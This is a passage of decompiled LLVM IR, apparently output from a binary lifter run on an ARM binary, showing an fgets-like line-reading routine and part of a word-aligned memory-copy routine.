  uselistorder i32* %r0.global-to-local, { 11, 1, 0, 4, 3, 2, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 128, { 5, 0, 4, 6, 1, 7, 10, 8, 9, 2, 11, 12, 13, 3 }
  uselistorder label %dec_label_pc_157f0, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_157ec, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_15804(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15804:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_15804 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15808 = icmp eq i32 %arg2, 0
  store i1 %v2_15808, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15890, label %dec_label_pc_15878.preheader

dec_label_pc_15878.preheader:                     ; preds = %dec_label_pc_15804
  store i32 %tmp, i32* @r5, align 4
  %v1_158782 = add i32 %arg2, -1
  store i32 %v1_158782, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_158788 = icmp eq i32 %arg2, 1
  store i1 %v7_158788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158788, label %dec_label_pc_15880, label %dec_label_pc_15824

dec_label_pc_15824:                               ; preds = %dec_label_pc_15878.preheader, %dec_label_pc_15878.backedge.dec_label_pc_15824_crit_edge
  %v0_15848 = phi i32 [ %v0_15824.pre, %dec_label_pc_15878.backedge.dec_label_pc_15824_crit_edge ], [ %arg3, %dec_label_pc_15878.preheader ]
  %v1_15824 = add i32 %v0_15848, 16
  %v2_15824 = inttoptr i32 %v1_15824 to i32*
  %v3_15824 = load i32, i32* %v2_15824, align 4
  store i32 %v3_15824, i32* %r2.global-to-local, align 4
  %v1_15828 = add i32 %v0_15848, 24
  %v2_15828 = inttoptr i32 %v1_15828 to i32*
  %v3_15828 = load i32, i32* %v2_15828, align 4
  store i32 %v3_15828, i32* %r3.global-to-local, align 4
  %v3_1582c = icmp uge i32 %v3_15824, %v3_15828
  store i1 %v3_1582c, i1* %cpsr_c.global-to-local, align 1
  %v9_1582c = icmp eq i32 %v3_15824, %v3_15828
  store i1 %v9_1582c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1582c, label %dec_label_pc_15848, label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_15824
  %v1_15834 = inttoptr i32 %v3_15824 to i8*
  %v2_15834 = load i8, i8* %v1_15834, align 1
  %v3_15834 = zext i8 %v2_15834 to i32
  store i32 %v3_15834, i32* %r3.global-to-local, align 4
  %v5_15834 = add i32 %v3_15824, 1
  store i32 %v5_15834, i32* %r2.global-to-local, align 4
  %v2_15838 = load i32, i32* @r5, align 4
  %v3_15838 = inttoptr i32 %v2_15838 to i8*
  store i8 %v2_15834, i8* %v3_15838, align 1
  %v4_15838 = load i32, i32* @r5, align 4
  %v5_15838 = add i32 %v4_15838, 1
  store i32 %v5_15838, i32* @r5, align 4
  %v0_1583c = load i32, i32* %r3.global-to-local, align 4
  %v2_1583c = icmp ugt i32 %v0_1583c, 9
  store i1 %v2_1583c, i1* %cpsr_c.global-to-local, align 1
  %v7_1583c = icmp eq i32 %v0_1583c, 10
  store i1 %v7_1583c, i1* %cpsr_z.global-to-local, align 1
  %v0_15840 = load i32, i32* %r2.global-to-local, align 4
  %v1_15840 = load i32, i32* @r4, align 4
  %v2_15840 = add i32 %v1_15840, 16
  %v3_15840 = inttoptr i32 %v2_15840 to i32*
  store i32 %v0_15840, i32* %v3_15840, align 4
  br i1 %v7_1583c, label %dec_label_pc_15880, label %dec_label_pc_15878.backedge

dec_label_pc_15848:                               ; preds = %dec_label_pc_15824
  %v1_15848 = inttoptr i32 %v0_15848 to i16*
  %v3_1584c = call i32 @function_156d8(i16* %v1_15848)
  %v3_15850 = icmp eq i32 %v3_1584c, -1
  store i1 %v3_15850, i1* %cpsr_c.global-to-local, align 1
  %v8_15850 = icmp eq i32 %v3_1584c, -1
  store i1 %v8_15850, i1* %cpsr_z.global-to-local, align 1
  %v1_15854 = urem i32 %v3_1584c, 256
  store i32 %v1_15854, i32* %r3.global-to-local, align 4
  br i1 %v3_15850, label %dec_label_pc_1585c, label %dec_label_pc_15874

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15848
  %v0_1585c = load i32, i32* @r4, align 4
  %v1_1585c = inttoptr i32 %v0_1585c to i16*
  %v2_1585c = load i16, i16* %v1_1585c, align 2
  %v3_1585c = zext i16 %v2_1585c to i32
  store i32 %v3_1585c, i32* %r3.global-to-local, align 4
  %v1_15860 = and i32 %v3_1585c, 8
  %v2_15860 = icmp eq i32 %v1_15860, 0
  store i1 %v2_15860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15860, label %dec_label_pc_15880, label %dec_label_pc_15890

dec_label_pc_15874:                               ; preds = %dec_label_pc_15848
  %v1_1586c = trunc i32 %v3_1584c to i8
  %v2_1586c = load i32, i32* @r5, align 4
  %v3_1586c = inttoptr i32 %v2_1586c to i8*
  store i8 %v1_1586c, i8* %v3_1586c, align 1
  %v4_1586c = load i32, i32* @r5, align 4
  %v5_1586c = add i32 %v4_1586c, 1
  store i32 %v5_1586c, i32* @r5, align 4
  %v0_15870 = load i32, i32* %r3.global-to-local, align 4
  %v2_15870 = icmp ugt i32 %v0_15870, 9
  store i1 %v2_15870, i1* %cpsr_c.global-to-local, align 1
  %v7_15870 = icmp eq i32 %v0_15870, 10
  store i1 %v7_15870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15870, label %dec_label_pc_15880, label %dec_label_pc_15878.backedge

dec_label_pc_15878.backedge:                      ; preds = %dec_label_pc_15874, %dec_label_pc_15834
  %v0_15878 = load i32, i32* %r6.global-to-local, align 4
  %v1_15878 = add i32 %v0_15878, -1
  store i32 %v1_15878, i32* %r6.global-to-local, align 4
  %v2_15878 = icmp ne i32 %v0_15878, 0
  store i1 %v2_15878, i1* %cpsr_c.global-to-local, align 1
  %v7_15878 = icmp eq i32 %v0_15878, 1
  store i1 %v7_15878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15878, label %dec_label_pc_15880, label %dec_label_pc_15878.backedge.dec_label_pc_15824_crit_edge

dec_label_pc_15878.backedge.dec_label_pc_15824_crit_edge: ; preds = %dec_label_pc_15878.backedge
  %v0_15824.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15824

dec_label_pc_15880:                               ; preds = %dec_label_pc_15874, %dec_label_pc_15878.backedge, %dec_label_pc_15834, %dec_label_pc_15878.preheader, %dec_label_pc_1585c
  %v0_15880 = load i32, i32* @r5, align 4
  %v1_15880 = load i32, i32* @r7, align 4
  %v3_15880 = icmp uge i32 %v0_15880, %v1_15880
  store i1 %v3_15880, i1* %cpsr_c.global-to-local, align 1
  %v9_15880 = icmp eq i32 %v0_15880, %v1_15880
  store i1 %v9_15880, i1* %cpsr_z.global-to-local, align 1
  %v2_15884 = xor i1 %v9_15880, true
  %v3_15884 = and i1 %v3_15880, %v2_15884
  br i1 %v3_15884, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15880
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15888 = inttoptr i32 %v0_15880 to i8*
  store i8 0, i8* %v7_15888, align 1
  %v0_1588c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1588c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15880, %bb
  %v1_1588c = phi i1 [ %v1_1588c.pre, %bb ], [ %v9_15880, %dec_label_pc_15880 ]
  %v0_1588c = phi i1 [ %v0_1588c.pre, %bb ], [ %v3_15880, %dec_label_pc_15880 ]
  %v2_1588c = xor i1 %v1_1588c, true
  %v3_1588c = and i1 %v0_1588c, %v2_1588c
  br i1 %v3_1588c, label %.dec_label_pc_15894_crit_edge, label %dec_label_pc_15890

.dec_label_pc_15894_crit_edge:                    ; preds = %.thread14
  %v0_15894.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15894

dec_label_pc_15890:                               ; preds = %dec_label_pc_15804, %dec_label_pc_1585c, %.thread14
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %.dec_label_pc_15894_crit_edge, %dec_label_pc_15890
  %v0_15894 = phi i32 [ %v0_15894.pre, %.dec_label_pc_15894_crit_edge ], [ 0, %dec_label_pc_15890 ]
  store i32 %v6_15804, i32* @r5, align 4
  ret i32 %v0_15894

; uselistorder directives
  uselistorder i1 %v9_15880, { 1, 0, 2 }
  uselistorder i32 %v1_15880, { 1, 0 }
  uselistorder i32 %v0_15880, { 0, 2, 1 }
  uselistorder i32 %v0_15878, { 2, 0, 1 }
  uselistorder i32 %v0_15870, { 1, 0 }
  uselistorder i32 %v3_1584c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1583c, { 1, 0 }
  uselistorder i32 %v3_15824, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15848, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i1 true, { 0, 1, 70, 106, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 66, 28, 29, 30, 31, 32, 72, 108, 126, 64, 67, 74, 112, 77, 76, 75, 33, 36, 107, 65, 73, 109, 110, 111, 91, 113, 114, 115, 116, 117, 37, 38, 118, 119, 120, 121, 92, 122, 123, 34, 35, 124, 125, 90, 89, 39, 40, 41, 127, 42, 43, 78, 79, 85, 80, 86, 81, 84, 128, 82, 88, 129, 44, 130, 45, 131, 93, 94, 132, 95, 96, 133, 97, 98, 46, 47, 134, 99, 100, 48, 49, 135, 101, 102, 50, 51, 136, 103, 104, 52, 53, 71, 137, 138, 87, 139, 54, 83, 55, 56, 68, 57, 58, 69, 59, 60, 61, 62, 63, 105 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_15894, { 1, 0 }
  uselistorder label %dec_label_pc_15890, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15880, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_15824, { 1, 0 }
}

define i32 @function_158b0() local_unnamed_addr {
dec_label_pc_158b0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_158b0 = load i32, i32* @r1, align 4
  %v1_158b0 = load i32, i32* @r0, align 4
  %v2_158b0 = sub i32 %v0_158b0, %v1_158b0
  %v3_158b0 = icmp ult i32 %v0_158b0, %v1_158b0
  %v4_158b0 = xor i32 %v1_158b0, %v0_158b0
  %v5_158b0 = xor i32 %v2_158b0, %v0_158b0
  %v6_158b0 = and i32 %v5_158b0, %v4_158b0
  %v7_158b0 = icmp slt i32 %v6_158b0, 0
  store i1 %v7_158b0, i1* %cpsr_v.global-to-local, align 1
  %v8_158b0 = icmp slt i32 %v2_158b0, 0
  store i1 %v8_158b0, i1* %cpsr_n.global-to-local, align 1
  %v9_158b0 = icmp eq i32 %v0_158b0, %v1_158b0
  store i1 %v9_158b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158b0, label %dec_label_pc_15b04, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %dec_label_pc_158b0
  br i1 %v9_158b0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_158b8
  %merge = phi i32 [ %v0_158b0, %dec_label_pc_158b8 ], [ %v2_15b98, %bb150 ], [ %v11_15bb4, %bb153 ], [ %v7_15bb4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_158b8
  %v5_158bc = inttoptr i32 %v1_158b0 to i8*
  store i8* %v5_158bc, i8** %stack_var_-8, align 4
  %v8_158bc = load i32, i32* @lr, align 4
  %v0_158c0 = load i32, i32* @r2, align 4
  %v2_158c0 = add i32 %v0_158c0, -4
  store i32 %v2_158c0, i32* %r2.global-to-local, align 4
  %v4_158c0 = sub i32 3, %v0_158c0
  %v5_158c0 = and i32 %v4_158c0, %v0_158c0
  %v6_158c0 = icmp slt i32 %v5_158c0, 0
  store i1 %v6_158c0, i1* %cpsr_v.global-to-local, align 1
  %v7_158c0 = icmp slt i32 %v2_158c0, 0
  store i1 %v7_158c0, i1* %cpsr_n.global-to-local, align 1
  %v8_158c0 = icmp eq i32 %v0_158c0, 4
  store i1 %v8_158c0, i1* %cpsr_z.global-to-local, align 1
  %v5_158c4 = icmp slt i32 %v0_158c0, 4
  br i1 %v5_158c4, label %bb140, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %bb
  %v1_158c8 = urem i32 %v1_158b0, 4
  store i32 %v1_158c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_158c8 = icmp eq i32 %v1_158c8, 0
  store i1 %v2_158c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158c8, label %dec_label_pc_158d0, label %dec_label_pc_1597c

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c8
  %v1_158d0 = urem i32 %v0_158b0, 4
  store i32 %v1_158d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_158d0 = icmp eq i32 %v1_158d0, 0
  store i1 %v2_158d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_158b0 to i2
  br i1 %v2_158d0, label %dec_label_pc_158d8, label %dec_label_pc_159ac

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_159a4
  %v0_158f094 = phi i32 [ %v1_158b0, %dec_label_pc_158d0 ], [ %v0_15acc77, %dec_label_pc_159a4 ]
  %v0_158ec93 = phi i32 [ %v0_158b0, %dec_label_pc_158d0 ], [ %v0_159a4, %dec_label_pc_159a4 ]
  %v0_158d8 = phi i32 [ %v2_158c0, %dec_label_pc_158d0 ], [ %v2_1599c, %dec_label_pc_159a4 ]
  %v1_158d8 = add i32 %v0_158d8, -8
  store i32 %v1_158d8, i32* %r2.global-to-local, align 4
  %v3_158d8 = sub i32 7, %v0_158d8
  %v4_158d8 = and i32 %v3_158d8, %v0_158d8
  %v5_158d8 = icmp slt i32 %v4_158d8, 0
  store i1 %v5_158d8, i1* %cpsr_v.global-to-local, align 1
  %v6_158d8 = icmp slt i32 %v1_158d8, 0
  store i1 %v6_158d8, i1* %cpsr_n.global-to-local, align 1
  %v7_158d8 = icmp eq i32 %v0_158d8, 8
  store i1 %v7_158d8, i1* %cpsr_z.global-to-local, align 1
  %v2_158dc = xor i1 %v6_158d8, %v5_158d8
  br i1 %v2_158dc, label %dec_label_pc_1592c, label %dec_label_pc_158e0

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158d8
  %v1_158e0 = add i32 %v0_158d8, -28
  store i32 %v1_158e0, i32* %r2.global-to-local, align 4
  %v3_158e0 = sub i32 27, %v0_158d8
  %v4_158e0 = and i32 %v3_158e0, %v1_158d8
  %v5_158e0 = icmp slt i32 %v4_158e0, 0
  store i1 %v5_158e0, i1* %cpsr_v.global-to-local, align 1
  %v6_158e0 = icmp slt i32 %v1_158e0, 0
  store i1 %v6_158e0, i1* %cpsr_n.global-to-local, align 1
  %v7_158e0 = icmp eq i32 %v1_158d8, 20
  store i1 %v7_158e0, i1* %cpsr_z.global-to-local, align 1
  %v2_158e4 = xor i1 %v6_158e0, %v5_158e0
  br i1 %v2_158e4, label %dec_label_pc_15918, label %dec_label_pc_158e8

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158e0
  %v0_158e8 = load i32, i32* @r4, align 4
  store i32 %v0_158e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge, %dec_label_pc_158e8
  %v0_158f0 = phi i32 [ %v12_158f8, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v0_158f094, %dec_label_pc_158e8 ]
  %v0_158ec = phi i32 [ %v0_158ec.pre, %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge ], [ %v0_158ec93, %dec_label_pc_158e8 ]
  %v1_158ec = inttoptr i32 %v0_158ec to i32*
  %v2_158ec = load i32, i32* %v1_158ec, align 4
  %v3_158ec = add i32 %v0_158ec, 4
  %v4_158ec = inttoptr i32 %v3_158ec to i32*
  %v5_158ec = load i32, i32* %v4_158ec, align 4
  store i32 %v5_158ec, i32* %r4.global-to-local, align 4
  %v6_158ec = add i32 %v0_158ec, 8
  %v7_158ec = inttoptr i32 %v6_158ec to i32*
  %v8_158ec = load i32, i32* %v7_158ec, align 4
  store i32 %v8_158ec, i32* %ip.global-to-local, align 4
  %v9_158ec = add i32 %v0_158ec, 12
  %v10_158ec = inttoptr i32 %v9_158ec to i32*
  %v11_158ec = load i32, i32* %v10_158ec, align 4
  store i32 %v11_158ec, i32* %lr.global-to-local, align 4
  %v12_158ec = add i32 %v0_158ec, 16
  store i32 %v12_158ec, i32* %r1.global-to-local, align 4
  %v1_158f0 = inttoptr i32 %v0_158f0 to i32*
  store i32 %v2_158ec, i32* %v1_158f0, align 4
  %v3_158f0 = add i32 %v0_158f0, 4
  %v4_158f0 = inttoptr i32 %v3_158f0 to i32*
  %v5_158f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158f0, i32* %v4_158f0, align 4
  %v6_158f0 = add i32 %v0_158f0, 8
  %v7_158f0 = inttoptr i32 %v6_158f0 to i32*
  %v8_158f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_158f0, i32* %v7_158f0, align 4
  %v9_158f0 = add i32 %v0_158f0, 12
  %v10_158f0 = inttoptr i32 %v9_158f0 to i32*
  %v11_158f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_158f0, i32* %v10_158f0, align 4
  %v12_158f0 = add i32 %v0_158f0, 16
  store i32 %v12_158f0, i32* %r0.global-to-local, align 4
  %v0_158f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_158f4 = inttoptr i32 %v0_158f4 to i32*
  %v2_158f4 = load i32, i32* %v1_158f4, align 4
  store i32 %v2_158f4, i32* @r3, align 4
  %v3_158f4 = add i32 %v0_158f4, 4
  %v4_158f4 = inttoptr i32 %v3_158f4 to i32*
  %v5_158f4 = load i32, i32* %v4_158f4, align 4
  store i32 %v5_158f4, i32* %r4.global-to-local, align 4
  %v6_158f4 = add i32 %v0_158f4, 8
  %v7_158f4 = inttoptr i32 %v6_158f4 to i32*
  %v8_158f4 = load i32, i32* %v7_158f4, align 4
  store i32 %v8_158f4, i32* @ip, align 4
  %v9_158f4 = add i32 %v0_158f4, 12
  %v10_158f4 = inttoptr i32 %v9_158f4 to i32*
  %v11_158f4 = load i32, i32* %v10_158f4, align 4
  store i32 %v11_158f4, i32* %lr.global-to-local, align 4
  %v12_158f4 = add i32 %v0_158f4, 16
  store i32 %v12_158f4, i32* @r1, align 4
  %v1_158f8 = inttoptr i32 %v12_158f0 to i32*
  store i32 %v2_158f4, i32* %v1_158f8, align 4
  %v3_158f8 = add i32 %v0_158f0, 20
  %v4_158f8 = inttoptr i32 %v3_158f8 to i32*
  %v5_158f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158f8, i32* %v4_158f8, align 4
  %v6_158f8 = add i32 %v0_158f0, 24
  %v7_158f8 = inttoptr i32 %v6_158f8 to i32*
  %v8_158f8 = load i32, i32* @ip, align 4
  store i32 %v8_158f8, i32* %v7_158f8, align 4
  %v9_158f8 = add i32 %v0_158f0, 28
  %v10_158f8 = inttoptr i32 %v9_158f8 to i32*
  %v11_158f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_158f8, i32* %v10_158f8, align 4
  %v12_158f8 = add i32 %v0_158f0, 32
  store i32 %v12_158f8, i32* @r0, align 4
  %v0_158fc = load i32, i32* %r2.global-to-local, align 4
  %v1_158fc = add i32 %v0_158fc, -32
  store i32 %v1_158fc, i32* %r2.global-to-local, align 4
  %v3_158fc = sub i32 31, %v0_158fc
  %v4_158fc = and i32 %v3_158fc, %v0_158fc
  %v5_158fc = icmp slt i32 %v4_158fc, 0
  %v6_158fc = icmp slt i32 %v1_158fc, 0
  %v2_15900 = xor i1 %v6_158fc, %v5_158fc
  br i1 %v2_15900, label %dec_label_pc_15904, label %dec_label_pc_158ec.dec_label_pc_158ec_crit_edge

dec_label_pc_158ec.dec_label_pc_158ec_crit_edge:  ; preds = %dec_label_pc_158ec
  %v0_158ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_158ec

dec_label_pc_15904:                               ; preds = %dec_label_pc_158ec
  %v1_15904 = add i32 %v0_158fc, -16
  %v3_15904 = add i32 %v0_158fc, 2147483616
  %v4_15904 = and i32 %v1_15904, %v3_15904
  %v5_15904 = icmp slt i32 %v4_15904, 0
  store i1 %v5_15904, i1* %cpsr_v.global-to-local, align 1
  %v6_15904 = icmp slt i32 %v1_15904, 0
  store i1 %v6_15904, i1* %cpsr_n.global-to-local, align 1
  %v7_15904 = icmp eq i32 %v1_15904, 0
  store i1 %v7_15904, i1* %cpsr_z.global-to-local, align 1
  %v2_15908 = xor i1 %v6_15904, %v5_15904
  br i1 %v2_15908, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_15904
  %v3_15908 = load i32, i32* @r1, align 4
  %v4_15908 = inttoptr i32 %v3_15908 to i32*
  %v5_15908 = load i32, i32* %v4_15908, align 4
  store i32 %v5_15908, i32* @r3, align 4
  %v6_15908 = add i32 %v3_15908, 4
  %v7_15908 = inttoptr i32 %v6_15908 to i32*
  %v8_15908 = load i32, i32* %v7_15908, align 4
  store i32 %v8_15908, i32* %r4.global-to-local, align 4
  %v9_15908 = add i32 %v3_15908, 8
  %v10_15908 = inttoptr i32 %v9_15908 to i32*
  %v11_15908 = load i32, i32* %v10_15908, align 4
  store i32 %v11_15908, i32* @ip, align 4
  %v12_15908 = add i32 %v3_15908, 12
  %v13_15908 = inttoptr i32 %v12_15908 to i32*
  %v14_15908 = load i32, i32* %v13_15908, align 4
  store i32 %v14_15908, i32* %lr.global-to-local, align 4
  %v15_15908 = add i32 %v3_15908, 16
  store i32 %v15_15908, i32* @r1, align 4
  %v4_1590c = inttoptr i32 %v12_158f8 to i32*
  store i32 %v5_15908, i32* %v4_1590c, align 4
  %v6_1590c = add i32 %v0_158f0, 36
  %v7_1590c = inttoptr i32 %v6_1590c to i32*
  %v8_1590c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1590c, i32* %v7_1590c, align 4
  %v9_1590c = add i32 %v0_158f0, 40
  %v10_1590c = inttoptr i32 %v9_1590c to i32*
  %v11_1590c = load i32, i32* @ip, align 4
  store i32 %v11_1590c, i32* %v10_1590c, align 4
  %v12_1590c = add i32 %v0_158f0, 44
  %v13_1590c = inttoptr i32 %v12_1590c to i32*
  %v14_1590c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1590c, i32* %v13_1590c, align 4
  %v15_1590c = add i32 %v0_158f0, 48
  store i32 %v15_1590c, i32* @r0, align 4
  %v3_15910 = load i32, i32* %r2.global-to-local, align 4
  %v4_15910 = add i32 %v3_15910, -16
  store i32 %v4_15910, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_15904, %bb136
  %v3_15920102111 = phi i32 [ %v15_1590c, %bb136 ], [ %v12_158f8, %dec_label_pc_15904 ]
  %v0_15918.pre = phi i32 [ %v4_15910, %bb136 ], [ %v1_158fc, %dec_label_pc_15904 ]
  %v2_15914 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15914, i32* @r4, align 4
  br label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %dec_label_pc_158e0, %bb137
  %v3_15920101 = phi i32 [ %v0_158f094, %dec_label_pc_158e0 ], [ %v3_15920102111, %bb137 ]
  %v0_15918 = phi i32 [ %v1_158e0, %dec_label_pc_158e0 ], [ %v0_15918.pre, %bb137 ]
  %v1_15918 = add i32 %v0_15918, 20
  store i32 %v1_15918, i32* %r2.global-to-local, align 4
  %v3_15918 = sub i32 0, %v0_15918
  %v4_15918 = and i32 %v1_15918, %v3_15918
  %v5_15918 = icmp slt i32 %v4_15918, 0
  store i1 %v5_15918, i1* %cpsr_v.global-to-local, align 1
  %v6_15918 = icmp slt i32 %v1_15918, 0
  store i1 %v6_15918, i1* %cpsr_n.global-to-local, align 1
  %v7_15918 = icmp eq i32 %v1_15918, 0
  store i1 %v7_15918, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1591c

dec_label_pc_1591c:                               ; preds = %.thread115, %dec_label_pc_15918
  %v0_1592c.pre157 = phi i32 [ %v0_1592c.pre, %.thread115 ], [ %v1_15918, %dec_label_pc_15918 ]
  %v3_15920 = phi i32 [ %v3_1592099116, %.thread115 ], [ %v3_15920101, %dec_label_pc_15918 ]
  %v1_15924 = phi i1 [ %v1_15928, %.thread115 ], [ %v5_15918, %dec_label_pc_15918 ]
  %v0_15924 = phi i1 [ %v0_15928, %.thread115 ], [ %v6_15918, %dec_label_pc_15918 ]
  %v2_1591c = xor i1 %v1_15924, %v0_15924
  br i1 %v2_1591c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1591c
  %v3_1591c = load i32, i32* @r1, align 4
  %v4_1591c = inttoptr i32 %v3_1591c to i32*
  %v5_1591c = load i32, i32* %v4_1591c, align 4
  store i32 %v5_1591c, i32* @r3, align 4
  %v6_1591c = add i32 %v3_1591c, 4
  %v7_1591c = inttoptr i32 %v6_1591c to i32*
  %v8_1591c = load i32, i32* %v7_1591c, align 4
  store i32 %v8_1591c, i32* @ip, align 4
  %v9_1591c = add i32 %v3_1591c, 8
  %v10_1591c = inttoptr i32 %v9_1591c to i32*
  %v11_1591c = load i32, i32* %v10_1591c, align 4
  store i32 %v11_1591c, i32* %lr.global-to-local, align 4
  %v12_1591c = add i32 %v3_1591c, 12
  store i32 %v12_1591c, i32* @r1, align 4
  %v4_15920 = inttoptr i32 %v3_15920 to i32*
  store i32 %v5_1591c, i32* %v4_15920, align 4
  %v6_15920 = add i32 %v3_15920, 4
  %v7_15920 = inttoptr i32 %v6_15920 to i32*
  %v8_15920 = load i32, i32* @ip, align 4
  store i32 %v8_15920, i32* %v7_15920, align 4
  %v9_15920 = add i32 %v3_15920, 8
  %v10_15920 = inttoptr i32 %v9_15920 to i32*
  %v11_15920 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15920, i32* %v10_15920, align 4
  %v12_15920 = add i32 %v3_15920, 12
  store i32 %v12_15920, i32* @r0, align 4
  %v3_15924 = load i32, i32* %r2.global-to-local, align 4
  %v4_15924 = add i32 %v3_15924, -12
  store i32 %v4_15924, i32* %r2.global-to-local, align 4
  %v6_15924 = sub i32 11, %v3_15924
  %v7_15924 = and i32 %v6_15924, %v3_15924
  %v8_15924 = icmp slt i32 %v7_15924, 0
  store i1 %v8_15924, i1* %cpsr_v.global-to-local, align 1
  %v9_15924 = icmp slt i32 %v4_15924, 0
  store i1 %v9_15924, i1* %cpsr_n.global-to-local, align 1
  %v10_15924 = icmp eq i32 %v3_15924, 12
  store i1 %v10_15924, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1591c, %bb138
  %v0_1592c.pre = phi i32 [ %v4_15924, %bb138 ], [ %v0_1592c.pre157, %dec_label_pc_1591c ]
  %v3_1592099116 = phi i32 [ %v12_15920, %bb138 ], [ %v3_15920, %dec_label_pc_1591c ]
  %v1_15928 = phi i1 [ %v8_15924, %bb138 ], [ %v1_15924, %dec_label_pc_1591c ]
  %v0_15928 = phi i1 [ %v9_15924, %bb138 ], [ %v0_15924, %dec_label_pc_1591c ]
  %v2_15928 = xor i1 %v1_15928, %v0_15928
  br i1 %v2_15928, label %dec_label_pc_1592c, label %dec_label_pc_1591c

dec_label_pc_1592c:                               ; preds = %.thread115, %dec_label_pc_158d8
  %v4_1593c = phi i32 [ %v0_158f094, %dec_label_pc_158d8 ], [ %v3_1592099116, %.thread115 ]
